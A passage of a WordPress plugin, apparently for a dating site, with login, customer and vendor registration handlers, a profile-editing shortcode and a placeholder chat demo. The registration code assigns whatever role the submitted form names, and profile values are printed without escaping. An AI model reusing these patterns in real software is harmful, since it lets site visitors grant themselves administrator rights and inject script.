                        <input type="hidden" name="doctor_register_nonce" value="<?php echo wp_create_nonce('doctor_register_nonce'); ?>"/>
                        <input type="submit" value="Join Now" class="default-btn" id="um-submit-btn">

                    </div>
                    <!-- <div class="um-right um-half">
                                    <a href="#" class="um-button um-alt">
                                    Login              </a>
                    </div> -->
                    <div class="um-clear"></div>
                </div>
            </form>
        </div>
    </div>
    <?php
    return ob_get_clean();
}
// login form fields
function crlfwnr_custom_login_form_fields() {

    ob_start(); ?>
    <h3 class="custom_header"><?php _e('Login'); ?></h3>

    <?php
    // show any error messages after form submission
    crlfwnr_custom_show_error_messages();
    $reg_options = get_option( 'reg_options' );
    ?>
    <script src='https://www.google.com/recaptcha/api.js'></script>
    <form id="crlfwnr_custom_login_form"  class="crlfwnr_custom_form" action="" method="post">
        <fieldset>
            <p>
                <label for="custom_user_Login">Username <span class="crlfwnr_required">*</span></label>
                <input name="custom_user_login" id="custom_user_login" class="required" type="text"/>
            </p>
            <p>
                <label for="custom_user_pass">Password <span class="crlfwnr_required">*</span></label>
                <input name="custom_user_pass" id="custom_user_pass" class="required" type="password"/>
            </p>

            <?php if($reg_options['captcha_login']){
                $captcha_theme = $reg_options['theme'];
                ?>
                <p><div class="g-recaptcha" data-theme="<?php echo $captcha_theme; ?>" data-sitekey="<?php echo $reg_options['site_key']; ?>"></div></p>
            <?php } ?>
            <p>
                <input type="hidden" name="custom_login_nonce" value="<?php echo wp_create_nonce('custom-login-nonce'); ?>"/>
                <input id="custom_login_submit" type="submit" value="Login"/>
            </p>
        </fieldset>
    </form>
    <?php
    return ob_get_clean();
}
// logs a member in after submitting a form
function crlfwnr_custom_login_member() {

    if(isset($_POST['custom_user_login']) && wp_verify_nonce($_POST['custom_login_nonce'], 'custom-login-nonce')) {

        // this returns the user ID and other info from the user name
        $user = get_userdatabylogin($_POST['custom_user_login']);

        if(!$user) {
            // if the user name doesn't exist
            crlfwnr_custom_errors()->add('empty_username', __('Invalid username'));
        }

        if(!isset($_POST['custom_user_pass']) || $_POST['custom_user_pass'] == '') {
            // if no password was entered
            crlfwnr_custom_errors()->add('empty_password', __('Please enter a password'));
        }

        // check the user's login with their password
        if(!wp_check_password($_POST['custom_user_pass'], $user->user_pass, $user->ID)) {
            // if the password is incorrect for the specified user
            crlfwnr_custom_errors()->add('empty_password', __('Incorrect password'));
        }

        $reg_options = get_option( 'reg_options' );
        $captcha_error = $reg_options['error_message'];
        $recaptcha=$_POST['g-recaptcha-response'];

        /*if(!empty($recaptcha))
        {

            $google_url="https://www.google.com/recaptcha/api/siteverify";
            $secret=$reg_options['secrete_key'];
            $ip=$_SERVER['REMOTE_ADDR'];
            $url=$google_url."?secret=".$secret."&response=".$recaptcha."&remoteip=".$ip;
            $res=getCurlData($url);
            $res= json_decode($res, true);
            if($res['success'])
            {}else{
            crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
            }
        }else{
        crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
        }*/
        if($reg_options['captcha_login']) {
            if (isset($_POST['g-recaptcha-response'])) {
                $recaptcha_secret = $reg_options['secrete_key'];
                $response = wp_remote_get("https://www.google.com/recaptcha/api/siteverify?secret=". $recaptcha_secret ."&response=". $_POST['g-recaptcha-response']);
                $response = json_decode($response["body"], true);
                //echo "<pre>";
                //print_r($response);    exit;
                if (true == $response["success"]) {
                    // return true;
                } else {
                    crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                    //return null;
                }
            } else {
                crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                //return null;
            }
        }


        // retrieve all error messages
        $errors = crlfwnr_custom_errors()->get_error_messages();

        // only log the user in if there are no errors
        if(empty($errors)) {

            wp_setcookie($_POST['custom_user_login'], $_POST['custom_user_pass'], true);
            wp_set_current_user($user->ID, $_POST['custom_user_login']);
            do_action('wp_login', $_POST['custom_user_login']);

            wp_redirect(home_url()); exit;
        }
    }
}
add_action('init', 'crlfwnr_custom_login_member');
// register a new user
function crlfwnr_custom_add_new_member() {
    global $wpdb;
    if (isset( $_POST["custom_user_first"] ) && wp_verify_nonce($_POST['custom_register_nonce'], 'custom-register-nonce')) {
        $user_login        = $_POST["custom_user_first"];
        $user_email        = $_POST["custom_user_email"];
        $user_first     = $_POST["custom_user_first"];
        $user_last       = $_POST["custom_user_last"];
        $custom_user_phone         = $_POST["custom_user_phone"];
        $custom_user_address       = $_POST["custom_user_address"];
        $custom_user_area_code     = $_POST["custom_user_area_code"];
        $custom_user_street        = $_POST["custom_user_street"];
        $custom_user_state         = $_POST["custom_user_state"];
        $user_pass        = $_POST["custom_user_pass"];
        $pass_confirm     = $_POST["custom_user_pass_confirm"];
        $user_role         = $_POST["user_role"];

        // this is required for username checks
        require_once(ABSPATH . WPINC . '/registration.php');

        if(username_exists($user_login)) {
            // Username already registered
            crlfwnr_custom_errors()->add('username_unavailable', __('Username already taken'));
        }
        if(!validate_username($user_login)) {
            // invalid username
            crlfwnr_custom_errors()->add('username_invalid', __('Invalid username'));
        }
        if($user_login == '') {
            // empty username
            crlfwnr_custom_errors()->add('username_empty', __('Please enter a username'));
        }
        if(!is_email($user_email)) {
            //invalid email
            crlfwnr_custom_errors()->add('email_invalid', __('Invalid email'));
        }
        if(email_exists($user_email)) {
            //Email address already registered
            crlfwnr_custom_errors()->add('email_used', __('Email already registered'));
        }
        if($user_pass == '') {
            // passwords do not match
            crlfwnr_custom_errors()->add('password_empty', __('Please enter a password'));
        }
        if($user_pass != $pass_confirm) {
            // passwords do not match
            crlfwnr_custom_errors()->add('password_mismatch', __('Passwords do not match'));
        }

        $reg_options = get_option( 'reg_options' );
        $captcha_error = $reg_options['error_message'];
        $recaptcha=$_POST['g-recaptcha-response'];
        $flag=0;

        if($reg_options['captcha_registration']) {
            if (isset($_POST['g-recaptcha-response'])) {
                $recaptcha_secret = $reg_options['secrete_key'];
                $response = wp_remote_get("https://www.google.com/recaptcha/api/siteverify?secret=". $recaptcha_secret ."&response=". $_POST['g-recaptcha-response']);
                $response = json_decode($response["body"], true);
                //echo "<pre>";
                //print_r($response);    exit;
                if (true == $response["success"]) {
                    // return true;
                } else {
                    crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                    //return null;
                }
            } else {
                crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                //return null;
            }
        }

        //echo $msg;

        $errors = crlfwnr_custom_errors()->get_error_messages();

        // only create the user in if there are no errors
        if(empty($errors)) {

            $new_user_id = wp_insert_user(array(
                    'user_login'        => $user_login,
                    'user_pass'             => $user_pass,
                    'user_email'        => $user_email,
                    'first_name'        => $user_first,
                    'last_name'            => $user_last,
                    'user_registered'    => date('Y-m-d H:i:s'),
                    'role'                =>   $user_role
                )
            );
            $post_type = '';
            // if($user_role === 'freelance_worker' ){
            //     $post_type = 'freelancer';
            // }elseif( $user_role === 'private_employer' ){
            //     $post_type = 'employe_detail';
            // }
            if($new_user_id) {
                // send an email to the admin alerting them of the registration
                wp_new_user_notification($new_user_id);
                // Create post object
                $my_post = array(
                    'post_type' =>  'customer',
                    'post_title'    =>  $user_first .'&nbsp;'. $user_last,
                    'post_content'  => '',
                    'post_status'   => 'publish',
                    'post_author'   => $new_user_id,
                    //'post_category' => array( 8,39 )
                );

                // Insert the post into the database
                $post_id = wp_insert_post( $my_post );
                update_field( 'phone_number',  $custom_user_phone, $post_id );
                update_field( 'customer_address', $custom_user_address,   $post_id );
                update_field( 'area_code', $custom_user_area_code, $post_id );
                update_field( 'street',  $custom_user_street, $post_id );
                update_field( 'state',  $custom_user_state, $post_id );
                // $table_name = "user_account";
                // $wpdb->insert( $table_name, array(
                //     'wp_user_id' => $new_user_id,
                //     'user_role' => $user_role,
                //     'registration_date' =>  date('Y-m-d H:i:s'),
                // ) );

                // log the new user in
                // wp_setcookie($user_login, $user_pass, true);
                // wp_set_current_user($new_user_id, $user_login);
                //do_action('wp_login', $user_login);

                // send the newly created user to the home page after logging them in
                wp_redirect(home_url('/account')); exit;
            }

        }

    }
}
add_action('init', 'crlfwnr_custom_add_new_member');
// Regster New Vendor here
function crlfwnr_vendor_add_new_member(){

    global $wpdb;
    if (isset( $_POST["vendor_register_nonce"] ) && wp_verify_nonce($_POST['vendor_register_nonce'], 'vendor-register-nonce')) {

        $user_login        = $_POST["custom_user_first"];
        $user_email        = $_POST["custom_user_email"];
        $user_first     = $_POST["custom_user_first"];
        $user_last       = $_POST["custom_user_last"];
        $custom_user_phone         = $_POST["custom_user_phone"];
        $custom_user_state         = $_POST["custom_user_state"];
        $custom_user_service         = $_POST["custom_user_service"];
        $user_pass        = $_POST["custom_user_pass"];
        $pass_confirm     = $_POST["custom_user_pass_confirm"];
        $user_role         = $_POST["user_role"];

        // this is required for username checks
        require_once(ABSPATH . WPINC . '/registration.php');

        if(username_exists($user_login)) {
            // Username already registered
            crlfwnr_custom_errors()->add('username_unavailable', __('Username already taken'));
        }
        if(!validate_username($user_login)) {
            // invalid username
            crlfwnr_custom_errors()->add('username_invalid', __('Invalid username'));
        }
        if($user_login == '') {
            // empty username
            crlfwnr_custom_errors()->add('username_empty', __('Please enter a username'));
        }
        if(!is_email($user_email)) {
            //invalid email
            crlfwnr_custom_errors()->add('email_invalid', __('Invalid email'));
        }
        if(email_exists($user_email)) {
            //Email address already registered
            crlfwnr_custom_errors()->add('email_used', __('Email already registered'));
        }
        if($user_pass == '') {
            // passwords do not match
            crlfwnr_custom_errors()->add('password_empty', __('Please enter a password'));
        }
        if($user_pass != $pass_confirm) {
            // passwords do not match
            crlfwnr_custom_errors()->add('password_mismatch', __('Passwords do not match'));
        }

        $reg_options = get_option( 'reg_options' );
        $captcha_error = $reg_options['error_message'];
        $recaptcha=$_POST['g-recaptcha-response'];
        $flag=0;

        if($reg_options['captcha_registration']) {
            if (isset($_POST['g-recaptcha-response'])) {
                $recaptcha_secret = $reg_options['secrete_key'];
                $response = wp_remote_get("https://www.google.com/recaptcha/api/siteverify?secret=". $recaptcha_secret ."&response=". $_POST['g-recaptcha-response']);
                $response = json_decode($response["body"], true);
                //echo "<pre>";
                //print_r($response);    exit;
                if (true == $response["success"]) {
                    // return true;
                } else {
                    crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                    //return null;
                }
            } else {
                crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                //return null;
            }
        }

        //echo $msg;

        $errors = crlfwnr_custom_errors()->get_error_messages();

        // only create the user in if there are no errors
        if(empty($errors)) {

            $new_user_id = wp_insert_user(array(
                    'user_login'        => $user_login,
                    'user_pass'             => $user_pass,
                    'user_email'        => $user_email,
                    'first_name'        => $user_first,
                    'last_name'            => $user_last,
                    'user_registered'    => date('Y-m-d H:i:s'),
                    'role'                =>   $user_role
                )
            );
            $post_type = '';
            // if($user_role === 'freelance_worker' ){
            //     $post_type = 'freelancer';
            // }elseif( $user_role === 'private_employer' ){
            //     $post_type = 'employe_detail';
            // }
            if($new_user_id) {
                // send an email to the admin alerting them of the registration
                wp_new_user_notification($new_user_id);
                // Create post object
                $my_post = array(
                    'post_type' =>  'vendor',
                    'post_title'    =>  $user_first .'&nbsp;'. $user_last,
                    'post_content'  => '',
                    'post_status'   => 'publish',
                    'post_author'   => $new_user_id,
                    //'post_category' => array( 8,39 )
                );

                // Insert the post into the database
                $post_id = wp_insert_post( $my_post );
                update_field( 'vendor_phone_number',  $custom_user_phone, $post_id );
                update_field( 'vendor_state', $custom_user_state,   $post_id );
                update_field( 'vendor_service', $custom_user_service, $post_id );
                /*  update_field( 'street',  $custom_user_street, $post_id );
                    update_field( 'state',  $custom_user_state, $post_id );*/


                // log the new user in
                // wp_setcookie($user_login, $user_pass, true);
                // wp_set_current_user($new_user_id, $user_login);
                //do_action('wp_login', $user_login);

                // send the newly created user to the home page after logging them in
                wp_redirect(home_url('/account')); exit;
            }

        }
    }

}
add_action('init', 'crlfwnr_vendor_add_new_member');
// used for tracking error messages
function crlfwnr_custom_errors(){
    static $wp_error; // Will hold global variable safely
    return isset($wp_error) ? $wp_error : ($wp_error = new WP_Error(null, null, null));
}
// displays error messages from form submissions
function crlfwnr_custom_show_error_messages() {
    if($codes = crlfwnr_custom_errors()->get_error_codes()) {
        echo '<div class="crlfwnr_custom_errors">';
        // Loop error codes and display errors
        foreach($codes as $code){
            $message = crlfwnr_custom_errors()->get_error_message($code);
            echo '<span class="error"><strong>' . __('Error') . '</strong>: ' . $message . '</span><br/>';
        }
        echo '</div>';
    }
}
// register our form css
function crlfwnr_custom_register_css() {
    wp_register_style('custom-form-css', plugin_dir_url( __FILE__ ) . '/css/forms.css');
}
add_action('init', 'crlfwnr_custom_register_css');
// load our form css
function crlfwnr_custom_print_css() {
    global $custom_load_css;

    // this variable is set to TRUE if the short code is used on a page/post
    if ( ! $custom_load_css )
        return; // this means that neither short code is present, so we get out of here

    wp_print_styles('custom-form-css');
}
add_action('wp_footer', 'crlfwnr_custom_print_css');
function um_current_user_profile(){

    $user_id = get_current_user_id();
    $user = get_userdata( $user_id );
    $user_roles = $user->roles;

    global $current_user;
    $email = $current_user->user_email;
    $args = array(
        'post_type' =>   'lets_get_serious',
        'author'         => $current_user->ID,

    );
    $the_query = new WP_Query( $args );
    //print_r($the_query);
    // The Loop
    if ( $the_query->have_posts() ) {
        while ( $the_query->have_posts() ) {
            $the_query->the_post(); ?>
            <!--  user profile form -->
            <style>
                .select2-container--default .select2-selection--multiple .select2-selection__choice__remove {
                    color: #fff !important;
                    cursor: pointer;
                    display: inline-block;
                    font-weight: bold;
                    margin-right: 2px;
                } section.user-setting-section form input:hover ,section.user-setting-section form textarea:hover ,section.user-setting-section form select:hover {border: 2px solid #271950 !important;/* transition: 1s !important; */}
                li.select2-selection__choice {padding: 7px !important;width: 130px;background: #291b53 !important;color: #fff !important;border: none !important;}
                .select2.select2-container .select2-selection.select2-selection--multiple {
                    height: auto !important;
                    line-height: 0.8 !important;
                    width: 532px !important;
                    margin-bottom: 16px;
                }.row.heightweight {width: 100% !important;}
                .widget{
                    background:unset !important;
                }
                .user-setting-section .profile-about-box .top-bg {
                    height: 160px;
                    background: url("https://staging.designinternal.com/wp/lets-get-serious/wp-content/uploads/2022/05/profile-box-bg.png") !important;
                    background-repeat: no-repeat;
                    background-position: bottom center;
                    background-size: cover  !important;
                    filter:brightness(49%) !important;
                }.user-setting-section .up-photo-card .content {
                     display: inline-table !important;
                     margin-top: 100px !important;
                 }
                input.custom-button {padding: 11px 35px !important;font-weight: 500 !important;border-radius: unset !important;transition: 1s !important; display:flex !important; margin: 0 auto !important; justify-content:center;width:100% !important; }
                input.custom-button:hover{ border-radius:50px !important; transition:2s !important; }
                /* .birth{width:550px !important; } */
                div#accordionExample {column-count: 2;padding: 20px;width: 100% !important;display: inline;}
                .regions {width: 100%;}
                .all {width: 100%;}
                .al{width: 100% !important;}
                span.matches-available {background: #281a51 !important;padding: 10px;color: #fff !important;transition: 1s !important;border-radius: 6px;font-size: 16px !important;}
                span.matches-available:hover {border-radius: 50px;transition: 1s !important;}
                .account-sec {padding-top: 18px !important ;width: 100% !important;}
            </style>
            <link rel="stylesheet" href="https://staging.designinternal.com/wp/lets-get-serious/wp-content/uploads/2022/05/main.css">
            <section class="user-setting-section">
                <div class="container">
                    <div class="row">

                        <div class="col-xl-12 col-md-7 ">
                            <form class="file-upload"  action="" method="post"  enctype='multipart/form-data'>
                                <input type="hidden" name="post_type_id" value="<?php echo get_the_ID();?>" >
                                <div class="page-title">
                                    Profile Info <br>
                                    <span class="matches-available">Available Matches : <?php the_field('match_count') ; ?></span>
                                </div>

                                <div class="row">
                                    <div class="col-lg-6">
                                        <div class="profile-about-box">
                                            <div class="top-bg"></div>
                                            <div class="p-inner-content">
                                                <div class="profile-img">
                                                    <div class="square position-relative display-2 mb-3">
                                                        <?php if( get_the_post_thumbnail_url(get_the_ID(),'full') ){
                                                            $featured_img_url = get_the_post_thumbnail_url(get_the_ID(),'small')
                                                            ?>
                                                            <img src="<?php echo $featured_img_url;?>" alt="">
                                                        <?php }else{ ?>
                                                            <img src="https://staging.designinternal.com/wp/lets-get-serious/wp-content/uploads/2022/05/usedravata.png" alt="">
                                                        <?php } ?>
                                                    </div>
                                                    <!-- <img src="https://staging.designinternal.com/wp/lets-get-serious/wp-content/uploads/2022/05/useravata.png" alt=""> -->
                                                    <div class="active-online"></div><br>

                                                </div>
                                                <br>
                                                <div class="user-name"><span class="userheading"><?php echo $current_user->first_name ;?></span></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-6">
                                        <div class="up-photo-card mb-30">
                                            <div class="icon">
                                                <i class="fas fa-user"></i>
                                            </div>
                                            <div class="content">
                                                <h4>
                                                    Change Avatar
                                                </h4>
                                                <span>
                                    120x120p size minimum
                                            <input type="file" name="profile_picture">
                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="input-info-box mt-30">
                                    <div class="header">
                                        About your Profile
                                    </div>
                                    <div class="content">
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="my-input-box">
                                                    <label for="">User Name</label>
                                                    <input style="background:#80808066;" type="text" placeholder="User Name" value="<?php echo $current_user->nickname; ?>" disabled>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="my-input-box">
                                                    <label for="">User Email</label>
                                                    <input style="background:#80808066;" type="text" placeholder="User Email" value="<?php echo $current_user->user_email; ?>" disabled>
                                                </div>
                                            </div>
                                            <div class="col-md-12">
                                                <div class="my-input-box">
                                                    <label for="">About me</label>
                                                    <textarea name="about_user" placeholder="Write a little description about you..." value=""><?php echo the_field('about_user'); ?></textarea>
                                                </div>
                                            </div>
                                            <div class="row all">
                                                <div class="col-md-6">
                                                    <div class="my-input-box">
                                                        <label for="">Phone no</label>
                                                        <input type="text" name="phone_no" placeholder="Phone no" value="<?php echo the_field('phone_no'); ?>" class="phones">
                                                    </div>
                                                </div>


                                                <div class="col-md-6">
                                                    <div class="my-input-box birth">
                                                        <label for="">Birthday</label>
                                                        <input type="text" name="date_of_birth" value="<?php echo the_field('date_of_birth'); ?>">
                                                    </div>
                                                </div>


                                            </div>

                                            <div class="row al">

                                                <div class="col-md-6">
                                                    <div class="my-input-box age">
                                                        <label for="">Age</label>
                                                        <input type="text" name="age" value="<?php echo the_field('age'); ?>">
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="my-input-box age">
                                                        <label for="">Gender</label>
                                                        <input type="text" name="gender" value="<?php echo the_field('gender'); ?>">
                                                    </div>
                                                </div>

                                            </div>

                                            <div class="row heightweight">
                                                <div class="col-md-4">
                                                    <div class="my-input-box age">
                                                        <label for="">Language</label>
                                                        <input type="text" name="language" value="<?php echo the_field('language'); ?>">
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="my-input-box age">
                                                        <label for="">Height</label>
                                                        <input type="text" name="height" value="<?php echo the_field('height'); ?>">
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="my-input-box age">
                                                        <label for="">Weight</label>
                                                        <input type="text" name="weight" value="<?php echo the_field('weight'); ?>">
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="row colors">
                                                <div class="col-md-4">
                                                    <div class="my-input-box age">
                                                        <label for="">Hair Color</label>
                                                        <input type="text" name="hair_color" value="<?php echo the_field('hair_color'); ?>">
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="my-input-box age">
                                                        <label for="">Eye Color</label>
                                                        <input type="text" name="eyes_color" value="<?php echo the_field('eyes_color'); ?>">
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="my-input-box age">
                                                        <label for="">Body Type</label>
                                                        <input type="text" name="body_type" value="<?php echo the_field('body_type'); ?>">
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="row chcks">
                                                <div class="col-lg-12">
                                                    <label for="">Interests</label>
                                                    <textarea class="intereststext" rows="80" cols="150" name="interests" placeholder="Write your interests" value=""><?php echo the_field('interests'); ?></textarea>
                                                    </select>

                                                </div>


                                            </div>

                                            <div class="row regions">

                                                <div class="col-md-4">
                                                    <div class="my-input-box country">
                                                        <label for="">Country</label>
                                                        <select id="country" class='form-control' name="country" value="<?php  the_field('country');?>">
                                                            <option value="<?php echo the_field('country');?>" >-- Country --</option>.
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="my-input-box region">
                                                        <label for="">Region</label>
                                                        <select id="region" class='form-control' name="region" value="<?php  the_field('region') ?>">
                                                            <option value="">-- Region --</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="my-input-box city">
                                                        <label for="">City</label>
                                                        <select id="city" class='form-control' name="city" value="<?php  the_field('city'); ?>">
                                                            <option value="">-- City --</option>
                                                        </select>
                                                    </div>
                                                </div>





                                            </div>
                                        </div>
                                    </div>
                                    <div class="buttons  mt-30">
                                        <input type="hidden"  id="nonce" name="mars_update_nonce" value="<?php echo wp_create_nonce('mars_update_nonce'); ?>">
                                        <input class="custom-button" type="submit" value="<?php _e('Update my Profile'); ?>"/>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
            </section>

            <section class="user-chat-history">

                <div class="wrapper">
                    <div class="container">
                        <div class="left">
                            <div class="top">
                                <input type="text" placeholder="Search" />
                                <a href="javascript:;" class="search"></a>
                            </div>
                            <ul class="people">
                                <li class="person" data-chat="person1">
                                    <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/382994/thomas.jpg" alt="" />
                                    <span class="name">Thomas Bangalter</span>
                                    <span class="time">2:09 PM</span>
                                    <span class="preview">I was wondering...</span>
                                </li>
                                <li class="person" data-chat="person2">
                                    <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/382994/dog.png" alt="" />
                                    <span class="name">Dog Woofson</span>
                                    <span class="time">1:44 PM</span>
                                    <span class="preview">I've forgotten how it felt before</span>
                                </li>
                                <li class="person" data-chat="person3">
                                    <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/382994/louis-ck.jpeg" alt="" />
                                    <span class="name">Louis CK</span>
                                    <span class="time">2:09 PM</span>
                                    <span class="preview">But we’re probably gonna need a new carpet.</span>
                                </li>
                                <li class="person" data-chat="person4">
                                    <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/382994/bo-jackson.jpg" alt="" />
                                    <span class="name">Bo Jackson</span>
                                    <span class="time">2:09 PM</span>
                                    <span class="preview">It’s not that bad...</span>
                                </li>
                                <li class="person" data-chat="person5">
                                    <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/382994/michael-jordan.jpg" alt="" />
                                    <span class="name">Michael Jordan</span>
                                    <span class="time">2:09 PM</span>
                                    <span class="preview">Wasup for the third time like is
you blind bitch</span>
                                </li>
                                <li class="person" data-chat="person6">
                                    <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/382994/drake.jpg" alt="" />
                                    <span class="name">Drake</span>
                                    <span class="time">2:09 PM</span>
                                    <span class="preview">howdoyoudoaspace</span>
                                </li>
                            </ul>
                        </div>
                        <div class="right">
                            <div class="top"><span>To: <span class="name">Dog Woofson</span></span></div>
                            <div class="chat" data-chat="person1">
                                <div class="conversation-start">
                                    <span>Today, 6:48 AM</span>
                                </div>
                                <div class="bubble you">
                                    Hello,
                                </div>
                                <div class="bubble you">
                                    it's me.
                                </div>
                                <div class="bubble you">
                                    I was wondering...
                                </div>
                            </div>
                            <div class="chat" data-chat="person2">
                                <div class="conversation-start">
                                    <span>Today, 5:38 PM</span>
                                </div>
                                <div class="bubble you">
                                    Hello, can you hear me?
                                </div>
                                <div class="bubble you">
                                    I'm in California dreaming
                                </div>
                                <div class="bubble me">
                                    ... about who we used to be.
                                </div>
                                <div class="bubble me">
                                    Are you serious?
                                </div>
                                <div class="bubble you">
                                    When we were younger and free...
                                </div>
                                <div class="bubble you">
                                    I've forgotten how it felt before
                                </div>
                            </div>
                            <div class="chat" data-chat="person3">
                                <div class="conversation-start">
                                    <span>Today, 3:38 AM</span>
                                </div>
                                <div class="bubble you">
                                    Hey human!
                                </div>
                                <div class="bubble you">
                                    Umm... Someone took a shit in the hallway.
                                </div>
                                <div class="bubble me">
                                    ... what.
                                </div>
                                <div class="bubble me">
                                    Are you serious?
                                </div>
                                <div class="bubble you">
                                    I mean...
                                </div>
                                <div class="bubble you">
                                    It’s not that bad...
                                </div>
                                <div class="bubble you">
                                    But we’re probably gonna need a new carpet.
                                </div>
                            </div>
                            <div class="chat" data-chat="person4">
                                <div class="conversation-start">
                                    <span>Yesterday, 4:20 PM</span>
                                </div>
                                <div class="bubble me">
                                    Hey human!
                                </div>
                                <div class="bubble me">
                                    Umm... Someone took a shit in the hallway.
                                </div>
                                <div class="bubble you">
                                    ... what.
                                </div>
                                <div class="bubble you">
                                    Are you serious?
                                </div>
                                <div class="bubble me">
                                    I mean...
                                </div>
                                <div class="bubble me">
                                    It’s not that bad...
                                </div>
                            </div>
                            <div class="chat" data-chat="person5">
                                <div class="conversation-start">
                                    <span>Today, 6:28 AM</span>
                                </div>
                                <div class="bubble you">
                                    Wasup
                                </div>
                                <div class="bubble you">
                                    Wasup
                                </div>
                                <div class="bubble you">
                                    Wasup for the third time like is <br />you blind bitch
                                </div>

                            </div>
                            <div class="chat" data-chat="person6">
                                <div class="conversation-start">
                                    <span>Monday, 1:27 PM</span>
                                </div>
                                <div class="bubble you">
                                    So, how's your new phone?
                                </div>
                                <div class="bubble you">
                                    You finally have a smartphone :D
                                </div>
                                <div class="bubble me">
                                    Drake?
                                </div>
                                <div class="bubble me">
                                    Why aren't you answering?
                                </div>
                                <div class="bubble you">
                                    howdoyoudoaspace
                                </div>
                            </div>
                            <div class="write">
                                <a href="javascript:;" class="write-link attach"></a>
                                <input type="text" />
                                <a href="javascript:;" class="write-link smiley"></a>
                                <a href="javascript:;" class="write-link send"></a>
                            </div>
                        </div>
                    </div>
                </div>
                <script type="text/javascript">
                    document.querySelector('.chat[data-chat=person2]').classList.add('active-chat');
                    document.querySelector('.person[data-chat=person2]').classList.add('active');

                    let friends = {
                            list: document.querySelector('ul.people'),
                            all: document.querySelectorAll('.left .person'),
                            name: '' },

                        chat = {
                            container: document.querySelector('.container .right'),
                            current: null,
                            person: null,
                            name: document.querySelector('.container .right .top .name') };


                    friends.all.forEach(f => {
                        f.addEventListener('mousedown', () => {
                            f.classList.contains('active') || setAciveChat(f);
                        });
                    });

                    function setAciveChat(f) {
                        friends.list.querySelector('.active').classList.remove('active');
                        f.classList.add('active');
                        chat.current = chat.container.querySelector('.active-chat');
                        chat.person = f.getAttribute('data-chat');
                        chat.current.classList.remove('active-chat');
                        chat.container.querySelector('[data-chat="' + chat.person + '"]').classList.add('active-chat');
                        friends.name = f.querySelector('.name').innerText;
                        chat.name.innerHTML = friends.name;
                    }
                </script>



            </section>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
            <script>

                $(document).ready(function() {
                    $(document).ready(function() {
                        $('.js-example-basic-multiple').select2();
                    });
                    //-------------------------------SELECT CASCADING-------------------------//
                    var selectedCountry = (selectedRegion = selectedCity = "");
                    // This is a demo API key for testing purposes. You should rather request your API key (free) from http://battuta.medunes.net/
                    var BATTUTA_KEY = "00000000000000000000000000000000";
                    // Populate country select box from battuta API
                    url =
                        "https://battuta.medunes.net/api/country/all/?key=" +
                        BATTUTA_KEY +
                        "&callback=?";

                    // EXTRACT JSON DATA.
                    $.getJSON(url, function(data) {
                        console.log(data);
                        $.each(data, function(index, value) {
                            // APPEND OR INSERT DATA TO SELECT ELEMENT.
                            $("#country").append(
                                '<option value="' + value.code + '">' + value.name + "</option>"
                            );
                        });
                    });
                    // Country selected --> update region list .
                    $("#country").change(function() {
                        selectedCountry = this.options[this.selectedIndex].text;
                        countryCode = $("#country").val();
                        // Populate country select box from battuta API
                        url =
                            "https://battuta.medunes.net/api/region/" +
                            countryCode +
                            "/all/?key=" +
                            BATTUTA_KEY +
                            "&callback=?";
                        $.getJSON(url, function(data) {
                            $("#region option").remove();
                            $('#region').append('<option value="">Please select your region</option>');
                            $.each(data, function(index, value) {
                                // APPEND OR INSERT DATA TO SELECT ELEMENT.
                                $("#region").append(
                                    '<option value="' + value.region + '">' + value.region + "</option>"
                                );
                            });
                        });
                    });
                    // Region selected --> updated city list
                    $("#region").on("change", function() {
                        selectedRegion = this.options[this.selectedIndex].text;
                        // Populate country select box from battuta API
                        countryCode = $("#country").val();
                        region = $("#region").val();
                        url =
                            "https://battuta.medunes.net/api/city/" +
                            countryCode +
                            "/search/?region=" +
                            region +
                            "&key=" +
                            BATTUTA_KEY +
                            "&callback=?";
                        $.getJSON(url, function(data) {
                            console.log(data);
                            $("#city option").remove();
                            $('#city').append('<option value="">Please select your city</option>');
                            $.each(data, function(index, value) {
                                // APPEND OR INSERT DATA TO SELECT ELEMENT.
                                $("#city").append(
                                    '<option value="' + value.city + '">' + value.city + "</option>"
                                );
                            });
                        });
                    });
                    // city selected --> update location string
                    $("#city").on("change", function() {
                        selectedCity = this.options[this.selectedIndex].text;
                        $("#location").html(
                            "Locatation: Country: " +
                            selectedCountry +
                            ", Region: " +
                            selectedRegion +
                            ", City: " +
                            selectedCity
                        );
                    });
                });


            </script>
            <!-- user profile conent
            -->
        <?php }
    } else {
        // no posts found
    }
    /* Restore original Post Data */
    wp_reset_postdata();
}
add_shortcode('lets_get_serious_user','um_current_user_profile');
// User Profile Code Starts From Here
function mars_update_profile() {
